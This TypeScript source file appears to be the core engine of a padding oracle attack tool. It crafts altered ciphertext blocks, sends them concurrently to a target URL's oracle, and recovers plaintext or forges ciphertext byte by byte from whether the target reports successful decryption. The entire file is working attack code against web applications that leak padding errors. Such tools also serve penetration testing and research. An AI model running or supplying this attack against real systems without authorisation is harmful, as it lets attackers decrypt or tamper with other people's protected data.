import bluebird from './bluebird' // eslint-disable-line import/order

import ow from 'ow'
import { range } from 'lodash'

import { logProgress, logWarning } from './logging'
import waitUntilFirstTruthyPromise from './promises'
import { PaddingOracleOptions } from './types'
import OracleCaller from './oracle-caller'

const PaddingOracle = (options: PaddingOracleOptions) => {
  const { networkStats, callOracle } = OracleCaller(options)
  const {
    ciphertext, plaintext, origBytes, foundBytes, interBytes, foundOffsets,
    url: _url, blockSize, blockCount, startFromFirstBlock,
    transformPayload, concurrency = 128, isDecryptionSuccess,
    logMode = 'full', isCacheEnabled = true, initFirstPayloadBlockWithOrigBytes = false
  } = options
  ow(_url, 'url', ow.string)
  ow(blockSize, ow.number)
  ow(concurrency, ow.number)
  ow(isDecryptionSuccess, ow.function)
  if (transformPayload) ow(transformPayload, ow.function)
  ow(logMode, ow.string)

  let stopLoggingProgress = false

  function constructPayload({ byteI, blockI, byte, currentPadding }: { byteI: number, blockI: number, byte: number, currentPadding: number }) {
    const firstBlock = Buffer.alloc(blockSize)
    if (initFirstPayloadBlockWithOrigBytes) ciphertext.copy(firstBlock, 0, blockI * blockSize)
    firstBlock[byteI] = byte
    for (const i of range(byteI + 1, blockSize)) {
      const offset = (blockSize * blockI) + i
      const interByte = interBytes[offset]
      firstBlock[i] = interByte ^ currentPadding
    }
    const start = (blockI + 1) * blockSize
    const secondBlock = ciphertext.slice(start, start + blockSize)
    const twoBlocks = Buffer.concat([firstBlock, secondBlock])
    return { twoBlocks }
  }
  let badErrorArgConfidence = 0
  function byteFound({ offset, byte, currentPadding }: { offset: number, byte: number, currentPadding: number }) {
    const origByte = origBytes[offset] // plaintext or ciphertext
    if (byte === origByte) badErrorArgConfidence++
    const interByte = byte ^ currentPadding
    const foundByte = origByte ^ interByte
    foundBytes[offset] = foundByte
    interBytes[offset] = interByte
    foundOffsets.add(offset)
  }
  async function processByte(
    { blockI, byteI, byte, currentPadding, offset }: { blockI: number, byteI: number, byte: number, currentPadding: number, offset: number }
  ): Promise<boolean> {
    const { twoBlocks } = constructPayload({ blockI, byteI, byte, currentPadding })

    if (foundOffsets.has(offset)) return true

    const req = await callOracle(twoBlocks)
    const decryptionSuccess = isDecryptionSuccess(req)

    if (decryptionSuccess) byteFound({ offset, byte, currentPadding })

    if (logMode === 'full' && !stopLoggingProgress) {
      if (!(foundOffsets.has(offset) && !decryptionSuccess)) { // make sure concurrency doesn't cause former bytes progress to be logged after later byte
        logProgress({ ciphertext, plaintext, foundOffsets, blockSize, blockI, byteI, byte, decryptionSuccess, networkStats, startFromFirstBlock, isCacheEnabled })
      }
    }

    return decryptionSuccess
  }
  const isDecrypting = origBytes === ciphertext
  async function processBlock(blockI: number) {
    let warningPrinted = false
    for (const byteI of range(blockSize - 1, -1)) {
      const currentPadding = blockSize - byteI
      const offset = (blockSize * blockI) + byteI
      if (foundOffsets.has(offset)) continue
      const cipherByte = ciphertext[offset]
      const byteRange = isDecrypting
        ? range(0, 256).filter(b => b !== cipherByte)
        : range(0, 256)
      if (concurrency > 1) {
        const promises = byteRange.map(byte => bluebird.method(() => processByte({ blockI, byteI, byte, currentPadding, offset })))
        await waitUntilFirstTruthyPromise(promises, { concurrency })
      } else {
        for (const byte of byteRange) {
          const success = await processByte({ blockI, byteI, byte, currentPadding, offset })
          if (success) break
        }
      }
      if (isDecrypting && !foundOffsets.has(offset)) {
        await processByte({ blockI, byteI, byte: cipherByte, currentPadding, offset })
      }
      if (!foundOffsets.has(offset)) {
        throw Error(`Padding oracle failure for offset: 0x${offset.toString(16)}. Try again or check the parameter you provided for determining decryption success.`)
      }
      if (!warningPrinted && badErrorArgConfidence > (blockSize / 2)) {
        logWarning('The parameter you provided for determining decryption success seems to be incorrect.')
        warningPrinted = true
      }
    }
  }
  async function processBlocks() {
    const blockIndexes = startFromFirstBlock ? range(blockCount - 1) : range(blockCount - 2, -1)
    for (const blockI of blockIndexes) {
      await processBlock(blockI)
    }
    stopLoggingProgress = true
  }
  return { processBlocks, callOracle }
}

export default PaddingOracle
